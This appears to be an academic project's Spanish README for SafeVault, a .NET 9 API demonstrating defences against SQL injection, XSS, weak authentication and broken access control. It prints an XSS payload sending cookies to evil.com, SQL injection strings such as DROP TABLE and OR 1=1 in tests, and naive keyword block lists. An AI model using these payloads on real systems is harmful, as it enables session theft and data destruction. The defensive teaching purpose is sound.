# SafeVault - Secure .NET Core 9 API

<p align="center">
  <img src="https://img.shields.io/badge/.NET-9.0-blue" alt=".NET 9.0">
  <img src="https://img.shields.io/badge/Security-Enhanced-green" alt="Security Enhanced">
  <img src="https://img.shields.io/badge/Tests-120%20Passing-brightgreen" alt="120 Tests Passing">
  <img src="https://img.shields.io/badge/License-MIT-yellow" alt="MIT License">
</p>

## 📋 Descripción del Proyecto

**SafeVault** es una API REST segura desarrollada en .NET Core 9 que demuestra las mejores prácticas de seguridad en aplicaciones web. Este proyecto fue creado como parte de un proyecto académico de seguridad informática, implementando protecciones contra las vulnerabilidades más comunes según OWASP.

### 🎯 Objetivos del Proyecto

1. **Prevención de Inyección SQL** - Uso de consultas parametrizadas y validación de entrada
2. **Prevención de XSS** - Sanitización de HTML y validación de patrones maliciosos
3. **Autenticación Segura** - Hash de contraseñas con BCrypt y tokens JWT
4. **Autorización RBAC** - Control de acceso basado en roles (Admin/User)
5. **Pruebas de Seguridad** - 120 tests unitarios validando las protecciones

---

## 🏗️ Arquitectura del Proyecto

```
SafeVault/
├── src/
│   ├── SafeVault.Api/           # Controladores y middleware
│   │   ├── Controllers/
│   │   │   ├── AuthController.cs      # Login y registro
│   │   │   ├── VaultController.cs     # CRUD de items (requiere auth)
│   │   │   └── AdminController.cs     # Operaciones admin (rol Admin)
│   │   └── Middleware/
│   │       ├── SecurityHeadersMiddleware.cs
│   │       └── ExceptionHandlingMiddleware.cs
│   │
│   ├── SafeVault.Core/          # Entidades, DTOs y validadores
│   │   ├── Entities/
│   │   │   ├── User.cs
│   │   │   ├── VaultItem.cs
│   │   │   └── Role.cs
│   │   ├── DTOs/
│   │   └── Validators/          # Validación con FluentValidation
│   │
│   └── SafeVault.Infrastructure/ # Acceso a datos y servicios de seguridad
│       ├── Data/
│       │   └── SafeVaultDbContext.cs
│       ├── Repositories/
│       └── Security/
│           ├── PasswordHasher.cs
│           ├── InputSanitizer.cs
│           └── JwtTokenService.cs
│
└── tests/
    └── SafeVault.Tests/         # 120 pruebas de seguridad
        ├── Security/
        │   ├── SqlInjectionTests.cs
        │   ├── XssPreventionTests.cs
        │   ├── PasswordHashingTests.cs
        │   └── AuthorizationTests.cs
        └── Validators/
            └── InputValidationTests.cs
```

---

## 🔒 Vulnerabilidades Abordadas y Soluciones

### 1. Inyección SQL (SQL Injection) - OWASP A03:2021

#### ❌ El Problema

La inyección SQL ocurre cuando un atacante puede insertar código SQL malicioso a través de campos de entrada, permitiendo:
- Acceso no autorizado a datos
- Modificación o eliminación de registros
- Ejecución de comandos del sistema

**Ejemplo de ataque:**
```
Username: admin'; DROP TABLE Users;--
```

#### ✅ Nuestra Solución

1. **Consultas Parametrizadas con Entity Framework Core:**
```csharp
// ❌ VULNERABLE - Concatenación de strings
var query = $"SELECT * FROM Users WHERE Username = '{username}'";

// ✅ SEGURO - Parámetros con LINQ
var user = await _context.Users
    .FirstOrDefaultAsync(u => u.Username == username);
```

2. **Validación de Patrones Maliciosos:**
```csharp
private static readonly string[] SqlInjectionPatterns = 
[
    "--", ";--", ";", "/*", "*/", "@@",
    "drop", "delete", "insert", "update", "select",
    "exec", "execute", "xp_", "sp_", "union"
];

private static bool NotContainSqlInjection(string? value)
{
    if (string.IsNullOrEmpty(value)) return true;
    var lowerValue = value.ToLowerInvariant();
    return !SqlInjectionPatterns.Any(pattern => lowerValue.Contains(pattern));
}
```

3. **Sanitización en Repositorios:**
```csharp
public async Task<VaultItem?> CreateAsync(VaultItem item)
{
    // Sanitizar contenido antes de guardar
    item.Title = _inputSanitizer.Sanitize(item.Title);
    item.Content = _inputSanitizer.SanitizeHtml(item.Content);
    
    _context.VaultItems.Add(item);
    await _context.SaveChangesAsync();
    return item;
}
```

---

### 2. Cross-Site Scripting (XSS) - OWASP A03:2021

#### ❌ El Problema

XSS permite a atacantes inyectar scripts maliciosos en páginas web, lo que puede:
- Robar cookies de sesión
- Redirigir usuarios a sitios maliciosos
- Capturar credenciales

**Ejemplo de ataque:**
```html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

#### ✅ Nuestra Solución

1. **Sanitización de HTML con HtmlSanitizer:**
```csharp
public class InputSanitizer : IInputSanitizer
{
    private readonly HtmlSanitizer _htmlSanitizer;
    
    public InputSanitizer()
    {
        _htmlSanitizer = new HtmlSanitizer();
        // Configurar etiquetas permitidas
        _htmlSanitizer.AllowedTags.Clear();
        _htmlSanitizer.AllowedTags.Add("p");
        _htmlSanitizer.AllowedTags.Add("br");
        _htmlSanitizer.AllowedTags.Add("strong");
        _htmlSanitizer.AllowedTags.Add("em");
        // Remover atributos peligrosos
        _htmlSanitizer.AllowedAttributes.Clear();
    }
    
    public string SanitizeHtml(string input)
    {
        return _htmlSanitizer.Sanitize(input);
    }
}
```

2. **Detección de Patrones XSS en Validadores:**
```csharp
private static readonly string[] XssPatterns = 
[
    "<script", "</script", "javascript:", "vbscript:",
    "onload=", "onerror=", "onclick=", "onmouseover=",
    "<iframe", "<object", "<embed", "eval(", "document.cookie"
];
```

3. **Cabeceras de Seguridad HTTP:**
```csharp
public class SecurityHeadersMiddleware
{
    public async Task InvokeAsync(HttpContext context)
    {
        // Prevenir XSS
        context.Response.Headers["X-XSS-Protection"] = "1; mode=block";
        context.Response.Headers["X-Content-Type-Options"] = "nosniff";
        context.Response.Headers["Content-Security-Policy"] = 
            "default-src 'self'; script-src 'self'";
        
        await _next(context);
    }
}
```

---

### 3. Autenticación Insegura - OWASP A07:2021

#### ❌ El Problema

Contraseñas almacenadas en texto plano o con algoritmos débiles pueden ser comprometidas:
- Exposición directa en brechas de datos
- Ataques de fuerza bruta exitosos
- Rainbow table attacks

#### ✅ Nuestra Solución

1. **Hash de Contraseñas con BCrypt:**
```csharp
public class PasswordHasher : IPasswordHasher
{
    private const int WorkFactor = 12; // 2^12 = 4,096 iteraciones
    
    public string HashPassword(string password)
    {
        if (string.IsNullOrEmpty(password))
            throw new ArgumentException("Password cannot be null or empty");
            
        return BCrypt.Net.BCrypt.HashPassword(password, WorkFactor);
    }
    
    public bool VerifyPassword(string password, string hash)
    {
        if (string.IsNullOrEmpty(password) || string.IsNullOrEmpty(hash))
            return false;
            
        try
        {
            return BCrypt.Net.BCrypt.Verify(password, hash);
        }
        catch
        {
            return false;
        }
    }
}
```

**¿Por qué BCrypt?**
- Salt único para cada contraseña
- Factor de trabajo configurable (resistente a hardware futuro)
- Deliberadamente lento para prevenir ataques de fuerza bruta

2. **Tokens JWT Seguros:**
```csharp
public string GenerateToken(User user)
{
    var claims = new[]
    {
        new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
        new Claim(ClaimTypes.Name, user.Username),
        new Claim(ClaimTypes.Email, user.Email),
        new Claim(ClaimTypes.Role, user.Role)
    };
    
    var key = new SymmetricSecurityKey(
        Encoding.UTF8.GetBytes(_configuration["Jwt:SecretKey"]!));
    var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);
    
    var token = new JwtSecurityToken(
        issuer: _configuration["Jwt:Issuer"],
        audience: _configuration["Jwt:Audience"],
        claims: claims,
        expires: DateTime.UtcNow.AddMinutes(expirationMinutes),
        signingCredentials: creds
    );
    
    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

3. **Validación de Contraseñas Fuertes:**
```csharp
RuleFor(x => x.Password)
    .MinimumLength(8)
    .Matches(@"[A-Z]").WithMessage("Debe contener mayúscula")
    .Matches(@"[a-z]").WithMessage("Debe contener minúscula")
    .Matches(@"[0-9]").WithMessage("Debe contener número")
    .Matches(@"[!@#$%^&*(),.?""':{}|<>]").WithMessage("Debe contener carácter especial");
```

---

### 4. Control de Acceso Roto - OWASP A01:2021

#### ❌ El Problema

Sin autorización adecuada, usuarios pueden:
- Acceder a datos de otros usuarios
- Realizar acciones administrativas sin permisos
- Escalar privilegios

#### ✅ Nuestra Solución

1. **Autorización Basada en Roles (RBAC):**
```csharp
// Controlador Admin - Solo usuarios con rol "Admin"
[ApiController]
[Route("api/[controller]")]
[Authorize(Roles = "Admin")]
public class AdminController : ControllerBase
{
    [HttpGet("users")]
    public async Task<ActionResult<IEnumerable<User>>> GetAllUsers()
    {
        // Solo admins pueden ver todos los usuarios
    }
}

// Controlador Vault - Usuarios autenticados
[Authorize]
public class VaultController : ControllerBase
{
    [HttpGet]
    public async Task<ActionResult<IEnumerable<VaultItem>>> GetMyItems()
    {
        var userId = GetCurrentUserId(); // Del token JWT
        var items = await _repository.GetByUserIdAsync(userId);
        return Ok(items);
    }
}
```

2. **Verificación de Propiedad:**
```csharp
[HttpPut("{id}")]
public async Task<IActionResult> UpdateItem(int id, UpdateVaultItemRequest request)
{
    var userId = GetCurrentUserId();
    var existingItem = await _repository.GetByIdAsync(id);
    
    if (existingItem == null)
        return NotFound();
    
    // Verificar que el item pertenece al usuario actual
    if (existingItem.UserId != userId)
        return Forbid(); // 403 Forbidden
    
    // Proceder con la actualización...
}
```

3. **Configuración JWT en Program.cs:**
```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = configuration["Jwt:Issuer"],
            ValidAudience = configuration["Jwt:Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(configuration["Jwt:SecretKey"]!))
        };
    });
```

---

## 🧪 Pruebas de Seguridad

El proyecto incluye **120 pruebas unitarias** organizadas por categoría:

### Distribución de Tests

| Categoría | Cantidad | Descripción |
|-----------|----------|-------------|
| SQL Injection | 25 | Validación de patrones maliciosos |
| XSS Prevention | 30 | Sanitización y detección de scripts |
| Password Hashing | 15 | BCrypt, salts, verificación |
| Authorization | 35 | Validación de roles y permisos |
| Input Validation | 15 | FluentValidation rules |

### Ejecutar Pruebas

```bash
# Ejecutar todas las pruebas
dotnet test

# Con detalles
dotnet test --logger:"console;verbosity=detailed"

# Solo pruebas de seguridad
dotnet test --filter "FullyQualifiedName~Security"
```

### Ejemplo de Test de SQL Injection

```csharp
[Theory]
[InlineData("admin'; DROP TABLE Users;--")]
[InlineData("' OR 1=1--")]
[InlineData("admin'; DELETE FROM Users--")]
[InlineData("' UNION SELECT * FROM Users--")]
public async Task Login_ShouldReject_SqlInjectionPatterns(string maliciousUsername)
{
    var request = new LoginRequest
    {
        Username = maliciousUsername,
        Password = "password123"
    };
    
    var result = await _loginValidator.ValidateAsync(request);
    
    result.IsValid.Should().BeFalse();
    result.Errors.Should().Contain(e => 
        e.ErrorMessage.Contains("invalid characters"));
}
```

---

## 🤖 Rol de GitHub Copilot en el Desarrollo

GitHub Copilot fue instrumental en el desarrollo de este proyecto, asistiendo en:

### 1. Generación de Arquitectura
- Sugerencias para la estructura de carpetas siguiendo Clean Architecture
- Generación de interfaces y abstracciones
- Configuración de dependencias

### 2. Patrones de Seguridad
- Implementación de validadores FluentValidation
- Patrones regex para detección de SQL injection y XSS
- Configuración de cabeceras de seguridad HTTP

### 3. Código de Pruebas
- Generación de casos de prueba parametrizados
- Datos de prueba para ataques conocidos
- Aserciones con FluentAssertions

### 4. Documentación
- Comentarios XML para métodos y clases
- Este README con explicaciones detalladas
- Ejemplos de código ilustrativos

### Ejemplo de Asistencia

**Prompt:** "Crear un validador FluentValidation que detecte patrones de SQL injection"

**Resultado Generado:**
```csharp
private static readonly string[] SqlInjectionPatterns = 
[
    "--", ";--", ";", "/*", "*/", "@@",
    "drop", "delete", "insert", "update", "select",
    "exec", "execute", "union", "where"
];

private static bool NotContainSqlInjection(string? value)
{
    if (string.IsNullOrEmpty(value)) return true;
    var lowerValue = value.ToLowerInvariant();
    return !SqlInjectionPatterns.Any(pattern => lowerValue.Contains(pattern));
}
```

---

## 🚀 Cómo Ejecutar el Proyecto

### Prerrequisitos
- .NET 9.0 SDK
- Visual Studio 2022 o VS Code

### Instalación

```bash
# Clonar el repositorio
git clone https://github.com/tu-usuario/SafeVault.git
cd SafeVault

# Restaurar paquetes
dotnet restore

# Compilar
dotnet build

# Ejecutar pruebas
dotnet test

# Ejecutar la API
cd src/SafeVault.Api
dotnet run
```

### Endpoints de la API

| Método | Endpoint | Descripción | Auth |
|--------|----------|-------------|------|
| POST | `/api/auth/register` | Registrar usuario | No |
| POST | `/api/auth/login` | Iniciar sesión | No |
| GET | `/api/vault` | Listar mis items | Sí |
| POST | `/api/vault` | Crear item | Sí |
| PUT | `/api/vault/{id}` | Actualizar item | Sí |
| DELETE | `/api/vault/{id}` | Eliminar item | Sí |
| GET | `/api/admin/users` | Listar usuarios | Admin |
| DELETE | `/api/admin/users/{id}` | Eliminar usuario | Admin |

---

## 📦 Dependencias Principales

```xml
<!-- Seguridad -->
<PackageReference Include="BCrypt.Net-Next" Version="4.0.3" />
<PackageReference Include="HtmlSanitizer" Version="9.0.889" />
<PackageReference Include="System.IdentityModel.Tokens.Jwt" Version="8.15.0" />

<!-- Validación -->
<PackageReference Include="FluentValidation" Version="12.1.1" />
<PackageReference Include="FluentValidation.DependencyInjectionExtensions" Version="12.1.1" />

<!-- Base de datos -->
<PackageReference Include="Microsoft.EntityFrameworkCore.InMemory" Version="9.0.0" />

<!-- Testing -->
<PackageReference Include="xunit" Version="2.9.3" />
<PackageReference Include="FluentAssertions" Version="8.3.0" />
<PackageReference Include="Moq" Version="4.20.72" />
```

---

## 📜 Licencia

Este proyecto está bajo la Licencia MIT. Ver el archivo [LICENSE](LICENSE) para más detalles.

---

## 👨‍💻 Autor

**Arturo Martínez**
- Proyecto académico de Seguridad Informática
- Desarrollado con asistencia de GitHub Copilot

---

## 📚 Referencias

- [OWASP Top 10 - 2021](https://owasp.org/Top10/)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [BCrypt.Net Documentation](https://github.com/BcryptNet/bcrypt.net)
- [FluentValidation Documentation](https://docs.fluentvalidation.net/)
